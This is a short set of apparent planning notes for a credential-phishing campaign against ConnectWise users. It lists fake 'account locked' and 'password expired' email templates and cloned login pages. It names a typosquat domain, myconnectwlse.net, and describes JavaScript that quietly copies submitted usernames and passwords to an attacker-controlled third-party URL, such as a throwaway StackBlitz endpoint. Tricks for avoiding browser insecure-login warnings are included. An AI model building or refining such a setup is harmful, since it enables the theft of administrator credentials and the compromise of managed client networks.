find / replace.src=" with src="https://na.myconnectwise.net/

reset password
Username, oldpassword, new password

template / landing pages 
email tempalate - connectwise locked
Landing page - cwlogin acct locked

email template - Cw password expired
landing page - connectwise change password

**obfuscate url and avoid insecure login warnings**
https://na.myconnectwlse.net/

let the form submit to its original location but add an event listener on the form submit that takes the values and submits them to your third party url

might be able to utilize a throwaway thing like ( a stackblitz project) to get a simple https uri to post to.

you could also create the fields as input="text" and when the user starts typing you could change it to type="password" with js

trying contenteditable 
<input autocapitalize="none" autocomplete="off" autocorrect="off" class="loginTextBox" id="password" name="password" onkeypress="javascript: if(event.keyCode==13) {document.getElementById(&#39;loginForm&#39;).submit()}" placeholder="Password" spellcheck="false" type="password"/>

I need a domain that looks like 
http://na.myconnectwise.net
myconnectwlse.net 


